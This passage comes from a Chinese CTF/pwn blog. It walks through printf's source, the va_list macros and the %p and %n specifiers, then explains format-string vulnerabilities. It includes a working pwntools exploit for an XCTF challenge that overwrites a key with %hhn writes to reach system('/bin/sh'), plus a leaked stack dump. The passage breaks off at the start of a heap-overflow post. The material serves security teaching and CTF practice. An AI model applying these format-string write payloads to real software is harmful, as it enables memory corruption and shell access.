class="line">(AP=((<span class="keyword">char</span> *)&amp;(LASTARG)+va_round_size(LASTARG)))</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> va_arg(AP,TYPE)<span class="comment">//va_arg</span></span></span><br><span class="line">(AP+=va_round_size(TYPE),*((TYPE*)(AP-va_round_size(TYPE)))) </span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> va_end(AP)<span class="comment">//va_end</span></span></span><br><span class="line">(ap=(va_list)<span class="number">0</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">//以上操作中的sizeof(int)只是32位的情况，如果是64位，则变为sizeof(int64)</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//针对TYPE为一个类型名的情况</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _sizeof_type(TYPE) (size_t)((TYPE*)0 + 1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//针对TYPE为一个变量或者数组名的情况</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _sizeof(TYPE) ((size_t)(&amp;TYPE + 1) - (size_t)(&amp;TYPE))</span></span><br></pre></td></tr></table></figure>
<p><strong>“sizeof”：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((<span class="keyword">size_t</span>)(&amp;TYPE + <span class="number">1</span>) - (<span class="keyword">size_t</span>)(&amp;TYPE))</span><br></pre></td></tr></table></figure>
<p><strong>“&amp;TYPE + 1”</strong>无非是一个很奇妙的东西，这个简单的“+1”操作<strong>并不是</strong>在“&amp;TYPE”的基础上加1字节</p>
<p>它的实际增加值会随着<strong>“TYPE”类型的变化</strong>而变化</p>
<p>​        //比如：“TYPE”为int类型，“+1”的实际值为“+4”，“TYPE”为double类型”，“+1”的实际值为“+8”</p>
<p>为什么会有这样的结果呢？</p>
<p>每一个变量标识符在<strong>编译期间</strong>，编译器会为它们创建一个<strong>符号表</strong>，其中存放着变量标识符相应的各种属性，如类型、地址标识等</p>
<p>“+1”代表了增加<strong>1个单位</strong>，具体的字节数是根据<strong>符号表</strong>计算得来的</p>
<p>​        //这一点在<strong>数组</strong>中很有用，比如对int类型的数组进行“+1”操作，实际上地址加了“4”</p>
<p>所以不管是什么类型（包括数组），sizeof都可以获取它的<strong>“长度”</strong></p>
<p><strong>“va_round_size”：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(((<span class="keyword">sizeof</span>(TYPE)+<span class="keyword">sizeof</span>(<span class="keyword">int</span>)<span class="number">-1</span>)/<span class="keyword">sizeof</span>(<span class="keyword">int</span>))*<span class="keyword">sizeof</span>(<span class="keyword">int</span>))</span><br></pre></td></tr></table></figure>
<p>简单翻译一下就是：“ (len(TYPE)+3) / 4 * 4 ”</p>
<p>1.整除4，然后乘4的操作，可以保证结果为<strong>4的倍数</strong>（只退不进）</p>
<p>2.“+3”则保证了结果<strong>最小为4</strong>（sizeof(TYPE)最小为“1”）</p>
<p>那么整个“va_round_size”就是为了<strong>获取“TYPE类型”的长度</strong>，并把结果保存为<strong>4的倍数</strong></p>
<p>​        //在64位的系统中，sizeof(int)变为sizeof(int64)，所以结果保存为<strong>8的倍数</strong>，且<strong>最小为8</strong></p>
<p><strong>“va_start”：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(AP=((<span class="keyword">char</span> *)&amp;(LASTARG)+va_round_size(LASTARG)))</span><br></pre></td></tr></table></figure>
<p>根据上文对“va_round_size”的分析：AP = “LASTARG”的地址 + “LASTARG”的长度</p>
<p>“LASTARG”就相当于案例中的“param1”，第一个参数，格式化参数</p>
<p>而格式化参数通常是一个字符串，所以“LASTARG”是一个数组</p>
<p>“va_start”的意义就在于：把<strong>AP</strong>赋值为“LASTARG”结束后的下一个地址</p>
<p>这个也不难理解：</p>
<p><img src="/2021/12/18/Printf%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/1639593048830-1639628397565.png" width="400" height="325">   </p>
<p>“LASTARG”的长度为<strong>4的倍数</strong>且<strong>最小为4</strong>，保证AP<strong>至少</strong>可以指向下一个地址空间</p>
<p>有时候<strong>“格式化参数”</strong>会比较长，可以占用好几个地址空间，这样设计就可以保证<strong>指针list</strong>指向<strong>“val1”</strong></p>
<p><strong>“va_arg”：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AP+=va_round_size(TYPE)//TYPE通常是指针类型，长度固定为‘一个字’</span><br><span class="line">*((TYPE*)(AP-va_round_size(TYPE)))</span><br></pre></td></tr></table></figure>
<p>进行“AP+va_round_size(TYPE)”操作，让<strong>AP</strong>加上“TYPE”的长度，使其指向下一个<strong>“val”</strong></p>
<p>“AP-va_round_size(TYPE)”就是它<strong>原本指向</strong>的变量“val”的地址</p>
<p>然后将其转化为“TYPE <em> ”类型，此时 “(TYPE </em>)(AP-va_round_size(TYPE))”就相当于“&amp;val”</p>
<p>“va_arg”实现了当前“val”的<strong>强制类型转换</strong>，并且使<strong>AP</strong>指向了下一个“val”</p>
<p><strong>“va_end”：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(ap=(va_list)<span class="number">0</span>) </span><br></pre></td></tr></table></figure>
<p>之前“char<em> ”被<strong>重定位</strong>成“va_list”，所以“va_list”就等同于“char</em> ”</p>
<p>“va_end”就相当于把<strong>AP</strong>指针置空了</p>
<p>参考博客： </p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/f110300641/article/details/83822290">https://blog.csdn.net/f110300641/article/details/83822290</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u013812502/article/details/81198452">https://blog.csdn.net/u013812502/article/details/81198452</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/hyb612/article/details/102598233">https://blog.csdn.net/hyb612/article/details/102598233</a></p>
<p>通过上述分析，我们已经认识了“printf”的执行过程，明白了它是如何<strong>获取参数</strong>，<strong>打印参数</strong>的</p>
<p>也了解了用于处理<strong>变参问题</strong>的一组宏定义：<strong>VA_LIST</strong>，分析了它的运行原理</p>
<p>接着就是分析格式化字符串中，两个重要<strong>控制符</strong>了：“%p”，“%n”</p>
<hr>
<h2 id="分析printf的控制符"><a href="#分析printf的控制符" class="headerlink" title="分析printf的控制符"></a>分析printf的控制符</h2><p>伪造控制符，这是格式化漏洞的核心</p>
<p>用“%p”可以泄露内存数据，用“%n”可以改写地址空间的内容</p>
<p>两者结合，就可以做到<strong>WriteAnythingAnywhere</strong></p>
<p><strong>“%p”：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&#x27;p&#x27;</span>:</span><br><span class="line"><span class="keyword">if</span>(field_width==<span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    field_width=<span class="number">0</span>;</span><br><span class="line">    flags|=ZEROPAD;<span class="comment">//#define ZEROPAD 1</span></span><br><span class="line">&#125;</span><br><span class="line">str=number(str,(<span class="keyword">unsigned</span> <span class="keyword">long</span>)va_arg(args,<span class="keyword">void</span>*),<span class="number">16</span>,field_width,precision,flags);</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<p>整个printf函数只有一个地方有“field_width= -1”</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">field_width=<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">isdigit</span>(*fmt))</span><br><span class="line">    field_width=getFieldWidth(&amp;fmt);<span class="comment">//获取域宽</span></span><br></pre></td></tr></table></figure>
<p>“field_width”被赋值“-1”后，只要符合if条件，它马上就会被重新覆盖</p>
<p>经过一些操作后：“field_width=0”，“precision=-1”，“flags=1”</p>
<p>进入函数“number”：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">char</span> *<span class="title">number</span><span class="params">(<span class="keyword">char</span> *str,<span class="keyword">int</span> num,<span class="keyword">int</span> base,<span class="keyword">int</span> size,<span class="keyword">int</span> precision,<span class="keyword">int</span> type)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//实参为：str，va_arg(args,void*)，16，field_width，precision，flags</span></span><br><span class="line">    <span class="keyword">char</span> c,sign,tmp[<span class="number">36</span>];</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *digits=<span class="string">&quot;0123456789ABCDEFGHIGKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="comment">//#define SMALL 64，#define LEFT 16，#define ZEROPAD 1，#define SIGN  2</span></span><br><span class="line">    <span class="keyword">if</span>(type&amp;SMALL) digits=<span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;</span>;<span class="comment">//不成立</span></span><br><span class="line">    <span class="keyword">if</span>(type&amp;LEFT) type&amp;=~ZEROPAD;<span class="comment">//false</span></span><br><span class="line">    <span class="keyword">if</span>(base&lt;<span class="number">2</span>||base&gt;<span class="number">36</span>)<span class="comment">//false</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    c=(type&amp;ZEROPAD)?<span class="string">&#x27;0&#x27;</span>:<span class="string">&#x27; &#x27;</span>;<span class="comment">// c=0</span></span><br><span class="line">    <span class="keyword">if</span>(type&amp;SIGN &amp;&amp; num&lt;<span class="number">0</span>)&#123;<span class="comment">//false</span></span><br><span class="line">         sign=<span class="string">&#x27;-&#x27;</span>;</span><br><span class="line">         num=-num;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//#define PLUS 4，#define SPACE 8，#define SPECIAL 32</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">         sign=(type&amp;PLUS)?<span class="string">&#x27;+&#x27;</span>:((type&amp;SPACE)?<span class="string">&#x27; &#x27;</span>:<span class="number">0</span>);<span class="comment">// sign=0</span></span><br><span class="line">    <span class="keyword">if</span>(sign)<span class="comment">//false</span></span><br><span class="line">         size--;</span><br><span class="line">    <span class="keyword">if</span>(type&amp;SPECIAL)<span class="comment">//false</span></span><br><span class="line">         <span class="keyword">if</span>(type==<span class="number">16</span>)</span><br><span class="line">             size-=<span class="number">2</span>;</span><br><span class="line">         <span class="keyword">else</span> <span class="keyword">if</span>(base==<span class="number">8</span>)</span><br><span class="line">             size--;</span><br><span class="line">    i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(num==<span class="number">0</span>)<span class="comment">//false</span></span><br><span class="line">        tmp[i++]=<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">while</span>(num!=<span class="number">0</span>)</span><br><span class="line">            tmp[i++]=digits[do_div(num,base)];<span class="comment">//tmp[0]=字长，i=1</span></span><br><span class="line">    <span class="keyword">if</span>(i&gt;precision)<span class="comment">//ture</span></span><br><span class="line">        precision=i;<span class="comment">// precision=1</span></span><br><span class="line">    size=-precision;<span class="comment">// size=-1</span></span><br><span class="line">    <span class="keyword">if</span>(!(type&amp;(ZEROPAD+LEFT)))<span class="comment">//false</span></span><br><span class="line">        <span class="keyword">while</span>(size--&gt;<span class="number">0</span>)</span><br><span class="line">            *str++=<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(sign)<span class="comment">//ture</span></span><br><span class="line">        *str++=sign;</span><br><span class="line">    <span class="keyword">if</span>(type&amp;SPECIAL)<span class="comment">//false</span></span><br><span class="line">        <span class="keyword">if</span>(base==<span class="number">8</span>)</span><br><span class="line">            *str++=<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(base==<span class="number">16</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            *str++=<span class="string">&#x27;o&#x27;</span>;</span><br><span class="line">            *str++=digits[<span class="number">33</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!(type&amp;LEFT))</span><br><span class="line">        <span class="keyword">while</span>(size--&gt;<span class="number">0</span>)</span><br><span class="line">            *str++=c;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;precision--)<span class="comment">//false</span></span><br><span class="line">        *str++=<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">    <span class="keyword">while</span>(i--&gt;<span class="number">0</span>)<span class="comment">//false</span></span><br><span class="line">        *str++=tmp[i];</span><br><span class="line">    <span class="keyword">while</span>(size--&gt;<span class="number">0</span>)<span class="comment">//false</span></span><br><span class="line">        *str++=<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个应该是printf中最复杂的函数了</p>
<p>其实程序在处理第二个参数<strong>va_arg(args,void*)</strong>的时候，就已经把<strong>当前“val”</strong>转化为指针了，这个指针的<strong>长度</strong>为<strong>字长</strong>（一个地址空间的长度）</p>
<p>剩下的部分就是对字符串进行：进制转换，补全，保留小数……这些部分都不是分析的重点</p>
<p>归根到底，<strong>“%p”</strong>就是想把当前的<strong>变量“val”</strong>变为<strong>空类型指针</strong></p>
<p>​        //目前没有搞清楚va_arg(args,void*)是怎么实现的</p>
<p><strong>“%n”：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&#x27;n&#x27;</span>:</span><br><span class="line">    ip=va_arg(args,<span class="keyword">int</span> *);</span><br><span class="line">    *ip=(str-buf);</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<p>编译过后：“ip=(args += va_round_size(int <em> )，</em>((int <em>* )(args - va_round_size(int </em> )))) ”</p>
<p>“args - va_round_size(int * )”是一个地址，其内容装有“val”的首地址，“val”指向真实的数据</p>
<img src="/2021/12/18/Printf%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/1639740337649.png" class width="1639740337649"> 
<p>“int ** ”代表了二阶指针，用于申明其内容“val”也是一个指针</p>
<p>进行第一行的操作后：ip被赋值为“&amp;val”（<strong>逗号表达式</strong>只取最后一个为结果）</p>
<p>“* ip”就是“val”的“data”，“data=(str-buf)”</p>
<p>仔细分析<strong>函数vsprintf</strong>：</p>
<p>遇到“%”前：</p>
<img src="/2021/12/18/Printf%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/1639748995340.png" class width="1639748995340"> 
<p>遇到“%”时：（同时，程序根据控制符“n”作出相应的相应）</p>
<img src="/2021/12/18/Printf%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/1639750075841.png" class width="1639750075841"> 
<p>遇到“%”后：</p>
<img src="/2021/12/18/Printf%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/1639750018493.png" class width="1639750018493">  
<p>程序不会把“%控制符”存储到“str/buf”中，取而代之的是对应格式的“val”</p>
<p>而“%n”不会打印“val”，而是会改变“val”</p>
<p>“buf”：数组“printbuf”的首地址（“buf/str”就是“printbuf”，用于存储将要打印的数据）</p>
<p>“str”：指针“fmt”遇到字符“%”时，当前指针“str”所指向的地址</p>
<p>“str-buf”：在排除“%控制符”后，将要打印数据的长度</p>
<p>所以<strong>“%n”</strong>可以改变对应“val”的内容，其数值为<strong>在排除“%控制符”后，将要打印数据的长度</strong></p>
<p>了解其他参数：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/thj_1995/article/details/109772890">https://blog.csdn.net/thj_1995/article/details/109772890</a></p>
<hr>
<h2 id="深入理解格式化漏洞"><a href="#深入理解格式化漏洞" class="headerlink" title="深入理解格式化漏洞"></a>深入理解格式化漏洞</h2><p>通过上文对printf的分析，想必对格式化漏洞的成因已经了解了</p>
<p>先看一段代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">locker</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">520</span>]; <span class="comment">// [esp+0h] [ebp-208h] BYREF</span></span><br><span class="line"></span><br><span class="line">  fgets(s, <span class="number">512</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  imagemagic(s);</span><br><span class="line">  <span class="keyword">if</span> ( key == <span class="number">35795746</span> )</span><br><span class="line">    <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(format, &amp;key, key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="number">53994</span>)</span><br><span class="line"></span><br><span class="line">key_addr = <span class="number">0x0804A048</span>      <span class="comment">#已知   				</span></span><br><span class="line"></span><br><span class="line">payload=p32(key_addr)      <span class="comment">#0x22          </span></span><br><span class="line">payload+=p32(key_addr+<span class="number">1</span>)   <span class="comment">#0x33           </span></span><br><span class="line">payload+=p32(key_addr+<span class="number">2</span>)   <span class="comment">#0x22           </span></span><br><span class="line">payload+=p32(key_addr+<span class="number">3</span>)   <span class="comment">#0x02           </span></span><br><span class="line"></span><br><span class="line">payload+=<span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>(<span class="number">0x22</span>-<span class="number">4</span>*<span class="number">4</span>)+<span class="string">&quot;c%12$hhn&quot;</span>        <span class="comment">#0x22         # 偏移  为 12</span></span><br><span class="line">payload+=<span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>(<span class="number">0x33</span>-<span class="number">0x22</span>)+<span class="string">&quot;c%13$hhn&quot;</span>       <span class="comment">#0x33         # 偏移  为 13</span></span><br><span class="line">payload+=<span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>(<span class="number">0x122</span>-<span class="number">0x33</span>)+<span class="string">&quot;c%14$hhn&quot;</span>      <span class="comment">#0x22         # 偏移  为 14</span></span><br><span class="line">payload+=<span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>(<span class="number">0x102</span>-<span class="number">0x22</span>)+<span class="string">&quot;c%15$hhn&quot;</span>      <span class="comment">#0x02         # 偏移  为 15</span></span><br><span class="line">								   </span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p>输入“%p”进行泄露：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>| <span class="number">0xffffcd10</span> --&gt; <span class="number">0xffffcd40</span> (<span class="string">&quot;aaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p\n&quot;</span>)</span><br><span class="line"><span class="number">0004</span>| <span class="number">0xffffcd14</span> --&gt; <span class="number">0xf7fe7b24</span> (pop    edx)</span><br><span class="line"><span class="number">0008</span>| <span class="number">0xffffcd18</span> --&gt; <span class="number">0xffffcf94</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">0012</span>| <span class="number">0xffffcd1c</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">0016</span>| <span class="number">0xffffcd20</span> --&gt; <span class="number">0xf7fb1000</span> --&gt; <span class="number">0x1ead6c</span> </span><br><span class="line"><span class="number">0020</span>| <span class="number">0xffffcd24</span> --&gt; <span class="number">0xf7fb1000</span> --&gt; <span class="number">0x1ead6c</span> </span><br><span class="line"><span class="number">0024</span>| <span class="number">0xffffcd28</span> --&gt; <span class="number">0xffffcf48</span> --&gt; <span class="number">0xffffcf58</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">0028</span>| <span class="number">0xffffcd2c</span> --&gt; <span class="number">0x80484e7</span> (&lt;locker+<span class="number">53</span>&gt;:	add    esp,<span class="number">0x10</span>)</span><br><span class="line"><span class="number">0032</span>| <span class="number">0xffffcd30</span> --&gt; <span class="number">0xffffcd40</span> (<span class="string">&quot;aaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p\n&quot;</span>)</span><br><span class="line"><span class="number">0036</span>| <span class="number">0xffffcd34</span> --&gt; <span class="number">0x200</span></span><br><span class="line"><span class="number">0040</span>| <span class="number">0xffffcd38</span> --&gt; <span class="number">0xf7fb1580</span> --&gt; <span class="number">0xfbad2288</span> </span><br><span class="line"><span class="number">0044</span>| <span class="number">0xffffcd3c</span> --&gt; <span class="number">0xf7fb7ea4</span> </span><br><span class="line"><span class="number">0048</span>| <span class="number">0xffffcd40</span> (<span class="string">&quot;aaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p\n&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>结果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaaa<span class="number">-0xf7fe7b24</span><span class="number">-0xffffcf94</span>-(nil)<span class="number">-0xf7fb1000</span><span class="number">-0xf7fb1000</span><span class="number">-0xffffcf48</span><span class="number">-0x80484e7</span><span class="number">-0xffffcd40</span><span class="number">-0x200</span><span class="number">-0xf7fb1580</span><span class="number">-0xf7fb7ea4</span><span class="number">-0x61616161</span><span class="number">-0x2d70252d</span><span class="number">-0x252d7025</span><span class="number">-0x70252d70</span><span class="number">-0x2d70252d</span></span><br></pre></td></tr></table></figure>
<p>可以发现：“fgets”写入“s”的地址为“0xffffcd40”，“printf”格式化参数的地址为“0xffffcd10”</p>
<p>想要利用“fgets”写入<strong>目标数据的地址</strong>并进行修改，必须先知道地址间偏移</p>
<p>这就是格式化字符串漏洞的基本操作</p>
<p><strong>最后说一个有意思的：</strong></p>
<p>在上述分析中“%n”和“%p”都可以把当前“val”转化为<strong>二阶指针</strong>（“va_arg(args,type* )”）</p>
<p>但是它们两个却有不同的效果：</p>
<p>“%p”只能泄露<strong>当前地址中的数据</strong>，如果该数据是个地址，那么它也不会跳转</p>
<p>“%n”则会<strong>跳转所有的地址</strong>，只要读取到地址就会跳转，直到不是地址才会被认为是数据</p>
<p>我觉得“%n”的运算是正常的，它的运算方式类似于<strong>二叉树</strong>，那么为什么“%p”的运算会<strong>“异常”</strong>呢？</p>
<p>原因就在于它的类型转换方式：va_arg(args,void* )</p>
<p>它把“val”转换为了<strong>空类型指针</strong></p>
<p>由于其他指针都包含有地址信息，所以将其他指针的值赋给空类型指针是合法的，反之，将空类型指针赋给其他指针则不被允许，除非进行显式转换 </p>
<p>所以<strong>空类型指针</strong>不能指向<strong>其他类型的指针</strong>，那么被“%p”支配的“val”不会再进行跳转了</p>
<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40627648/article/details/84672125">https://blog.csdn.net/qq_40627648/article/details/84672125</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/12/12/%E5%A0%86%E6%BA%A2%E5%87%BA+malloc_hook%E5%8A%AB%E6%8C%81/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/12/12/%E5%A0%86%E6%BA%A2%E5%87%BA+malloc_hook%E5%8A%AB%E6%8C%81/" class="post-title-link" itemprop="url">堆溢出+malloc_hook劫持</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-12-12 20:14:09" itemprop="dateCreated datePublished" datetime="2021-12-12T20:14:09+08:00">2021-12-12</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-02-03 16:53:22" itemprop="dateModified" datetime="2022-02-03T16:53:22+08:00">2022-02-03</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>12k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>11 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>堆溢出+malloc_hook劫持</strong></p>
<p>前几天遇到XCFT上的堆题，搞了很久才搞出来，也学到了很多东西，在此分享一下</p>
<p>题目链接： <a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/task/answer?type=pwn&amp;number=2&amp;grade=1&amp;id=4691&amp;page=2">题目 (xctf.org.cn)</a> </p>
<p><img src="/2021/12/12/%E5%A0%86%E6%BA%A2%E5%87%BA+malloc_hook%E5%8A%AB%E6%8C%81/1638887436600.png" width="400" height="200">  </p>
<p><img src="/2021/12/12/%E5%A0%86%E6%BA%A2%E5%87%BA+malloc_hook%E5%8A%AB%E6%8C%81/1638887493261-1639312166147.png" alt="1638887493261"></p>
<p><img src="/2021/12/12/%E5%A0%86%E6%BA%A2%E5%87%BA+malloc_hook%E5%8A%AB%E6%8C%81/1638887500660-1639312195178.png" alt="1638887500660"> </p>
<p>64位，dynamically，开了Canary，开了Full</p>
<p><img src="/2021/12/12/%E5%A0%86%E6%BA%A2%E5%87%BA+malloc_hook%E5%8A%AB%E6%8C%81/1638887658901-1639312232537.png" alt="1638887658901"> </p>
<p><img src="/2021/12/12/%E5%A0%86%E6%BA%A2%E5%87%BA+malloc_hook%E5%8A%AB%E6%8C%81/1638887666373-1639312267611.png" alt="1638887666373"> </p>
<p><strong>代码分析</strong></p>
<p>程序有4个选项</p>
<p>选项1：申请一片堆空间，大小自定义，可以写入数据（可以申请10次，第11次会被强行释放）</p>
<p>​        //在堆中写入数据的指针会被写入bss段</p>
